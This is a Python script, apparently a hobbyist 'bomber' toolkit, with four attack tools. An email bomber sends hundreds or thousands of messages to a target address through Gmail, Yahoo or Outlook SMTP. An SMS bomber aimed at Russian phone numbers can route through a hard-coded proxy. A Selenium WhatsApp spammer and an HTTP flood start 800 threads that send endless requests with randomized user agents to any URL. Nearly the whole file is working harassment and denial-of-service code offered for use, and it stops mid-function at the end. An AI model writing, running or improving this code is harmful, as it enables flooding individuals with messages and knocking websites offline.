# -*- coding: utf-8 -*-

import smtplib
import sys
import services
import random
import telebot
import os
import requests
import datetime
import progressbar
import time

from threading import Thread
from selenium import webdriver
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager 



print('''╭━━━━┳╮     ╭━━╮╭━━━┳━━━┳━━━━╮╭━━╮   ╭━╮╭━┳╮ ╭━━━╮
┃╭╮╭╮┃┃     ┃╭╮┃┃╭━━┫╭━╮┃╭╮╭╮┃┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯
╰╯┃┃╰┫╰━┳━━╮┃╰╯╰┫╰━━┫╰━━╋╯┃┃╰╯┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮
  ┃┃ ┃╭╮┃┃━┫┃╭━╮┃╭━━┻━━╮┃ ┃┃  ┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯
  ┃┃ ┃┃┃┃┃━┫┃╰━╯┃╰━━┫╰━╯┃ ┃┃  ┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃
  ╰╯ ╰╯╰┻━━╯╰━━━┻━━━┻━━━╯ ╰╯  ╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯
	''')

def emailbomber():

	def banner():
	    print('''		
╭━━━╮      ╭╮ ╭━━╮   ╭━╮╭━┳╮ ╭━━━╮
┃╭━━╯      ┃┃ ┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯
┃╰━━┳╮╭┳━━┳┫┃ ┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮
┃╭━━┫╰╯┃╭╮┣┫┃ ┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯
┃╰━━┫┃┃┃╭╮┃┃╰╮┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃
╰━━━┻┻┻┻╯╰┻┻━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯
	    	''')


	class Email_Bomber:
	    count = 0

	    def __init__(self):
	        try:
	            print('\nInitializing program...\n')
	            self.target = str(input('Enter target email: '))
	            self.mode = int(input('Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom): '))
	            if int(self.mode) > int(4) or int(self.mode) < int(1):
	                print('ERROR: Invalid Option.')
	                sys.exit(1)
	        except Exception as e:
	            print(f'ERROR: {e}')

	    def bomb(self):
	        try:
	            print('\nSetting up bomb')
	            self.amount = None
	            if self.mode == int(1):
	                self.amount = int(1000)
	            elif self.mode == int(2):
	                self.amount = int(500)
	            elif self.mode == int(3):
	                self.amount = int(250)
	            else:
	                self.amount = int(input('Choose a CUSTOM amount: '))
	            print(f'\nYou have selected BOMB mode: {self.mode} and {self.amount} emails')
	        except Exception as e:
	            print(f'ERROR: {e}')

	    def email(self):
	        try:
	            print('\nSetting up email')
	            self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook: '))
	            premade = ['1', '2', '3']
	            default_port = True
	            if self.server not in premade:
	                default_port = False
	                self.port = int(input('Enter port number: '))

	            if default_port == True:
	                self.port = int(587)

	            if self.server == '1':
	                self.server = 'smtp.gmail.com'
	            elif self.server == '2':
	                self.server = 'smtp.mail.yahoo.com'
	            elif self.server == '3':
	                self.server = 'smtp-mail.outlook.com'

	            self.fromAddr = str(input('Enter from address: '))
	            self.fromPwd = str(input('Enter from password: '))
	            self.subject = str(input('Enter subject: '))
	            self.message = str(input('Enter message: '))

	            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
	            ''' % (self.fromAddr, self.target, self.subject, self.message)

	            self.s = smtplib.SMTP(self.server, self.port)
	            self.s.ehlo()
	            self.s.starttls()
	            self.s.ehlo()
	            self.s.login(self.fromAddr, self.fromPwd)
	        except Exception as e:
	            print(f'ERROR: {e}')

	    def send(self):
	        try:
	            self.s.sendmail(self.fromAddr, self.target, self.msg)
	            self.count +=1
	            print(f'BOMB: {self.count}')
	        except Exception as e:
	            print(f'ERROR: {e}')

	    def attack(self):
	        print('\nAttacking...')
	        for email in range(self.amount+1):
	            self.send()
	        self.s.close()
	        print('\nAttack finished')
	        input()
	        "sys.exit(0)"


	if __name__=='__main__':
	    banner()
	    bomb = Email_Bomber()
	    bomb.bomb()
	    bomb.email()
	    bomb.attack()

def smsbomber():
	print('''
╭━━━┳━╮╭━┳━━━╮╭━━╮   ╭━╮╭━┳╮ ╭━━━╮
┃╭━╮┃ ╰╯ ┃╭━╮┃┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯
┃╰━━┫╭╮╭╮┃╰━━╮┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮
╰━━╮┃┃┃┃┃┣━━╮┃┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯
┃╰━╯┃┃┃┃┃┃╰━╯┃┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃
╰━━━┻╯╰╯╰┻━━━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯
	''')

	print('Enter the number without or with prefixes (+7) (8):')
	input_number = input(">> ")
	print('How many sms to send?')
	sms = int(input(">> "))

	print(f"You need a tor y/n?")
	is_tor = input(">> ")


	def parse_number(number):
		msg = f"Check number - OK"
		if len(number) in (10, 11, 12):
			if number[0] == "8":
				number = number[1:]
				print(msg)
			elif number[:2] == "+7":
				number = number[2:]
				print(msg)
			elif int(len(number)) == 10 and number[0] == 9:
				print(msg)
		else:
			print(f"Check number - failed!\nThis bomber is intended only for Russia!")
			quit()
		return number
	number = parse_number(input_number)

	# tor
	if str(is_tor) == "y":
	        print(f"Launch Tor...")
	        proxies = {
	            'http': 'socks5://139.59.53.105:1080',
	            'https': 'socks5://139.59.53.105:1080'
	        }
	        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
	        tor = (tor.replace('\n', ''))
	        print(f"Launch Tor - OK")

	services.attack(number, sms)

def wbomber():
	print('''		    
╭╮╭╮╭┳╮    ╭╮   ╭━━━╮      ╭━━╮   ╭━╮╭━┳╮ ╭━━━╮
┃┃┃┃┃┃┃   ╭╯╰╮  ┃╭━╮┃      ┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯
┃┃┃┃┃┃╰━┳━┻╮╭╋━━┫┃ ┃┣━━┳━━╮┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮
┃╰╯╰╯┃╭╮┃╭╮┃┃┃━━┫╰━╯┃╭╮┃╭╮┃┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯
╰╮╭╮╭┫┃┃┃╭╮┃╰╋━━┃╭━╮┃╰╯┃╰╯┃┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃
 ╰╯╰╯╰╯╰┻╯╰┻━┻━━┻╯ ╰┫╭━┫╭━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯
                    ┃┃ ┃┃
                    ╰╯ ╰╯
	''')

	driver = webdriver.Chrome(ChromeDriverManager().install()) 
	driver.get('https://web.whatsapp.com/')

	name = input('Enter the name of user or group: ')
	msg = input('Enter your message: ')
	count = int(input('Enter the count: '))

	input('Enter any key after scanning QR code: ')

	user = driver.find_element_by_xpath('//span[@title = "{}"]'.format(name))
	user.click()
	
	msg_box = driver.find_element_by_xpath('//*[@id="main"]/footer/div[1]/div[2]/div/div[2]') 
		
	for i in range(count):
		msg_box.send_keys(msg)
		button = driver.find_element_by_xpath('//*[@id="main"]/footer/div[1]/div[3]/button') 
		button.click() 
	print('Bombing Complete')

def doser():
	pb()
	print('''
╭━━━╮      ╭━━╮   ╭━╮╭━┳╮ ╭━━━╮
╰╮╭╮┃      ┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯
 ┃┃┃┣━━┳━━╮┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮
 ┃┃┃┃╭╮┃━━┫┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯
╭╯╰╯┃╰╯┣━━┃┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃
╰━━━┻━━┻━━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯
		''')
	print("You can abort the attack by clicking: ctr+z")
	users = [
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36",
	    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 9; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
	    "Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0",
	    "Mozilla/5.0 (Android 9; Mobile; rv:67.0.3) Gecko/67.0.3 Firefox/67.0.3",
	    "Mozilla/5.0 (Android 7.1.1; Tablet; rv:67.0) Gecko/67.0 Firefox/67.0",
	    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.27 Safari/537.36 OPR/62.0.3331.10 (Edition beta)",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	    "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	    "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	    "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	    "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	    "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	    "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	    "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
	    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
	    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
	    "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
	    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	    "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
	    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
	    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
	    "Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
	    "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
	    "Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
	    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
	    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
	    "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
	    "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	    "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	    "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	    "Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
	    "Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	    "Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
	    "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
	    "Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
	    "Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
	    "Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
	    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
	    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
	    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
	    "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
	    "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	    "Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
	    "Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	    "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
	    "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
	    "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
	    "Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
	    "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
	    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
	    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
	    "Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
	    "Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
	    "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
	    "Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
	    "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
	    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
	    "Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
	    "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
	    "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
	    "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.5",
	    "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
	    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
	    "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
	    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
	    "Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
	    "Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
	    "Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
	    "Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
	    "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
	    "Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
	    "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
	    "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
	    "Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
	    "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
	    "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	    "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	    "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	    "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	    "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
	    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
	    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
	    "Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN"
	]
	headers = {
		'User-Agent' : random.choice(users)
	}
	url = input("url for dos attak:")
	def send():
		while True:
			requests.get(url, headers=headers)
			print("Get...")
			requests.post(url, headers=headers)
			print("post...")
			requests.head(url, headers=headers)
			print("head...")

	if __name__ == '__main__':
		for i in range (800):
			thr = Thread(target=send)
			thr.start()

def pb():
	toolbar_width = 40

	# setup toolbar
	sys.stdout.write("[%s]" % (" " * toolbar_width))
	sys.stdout.flush()
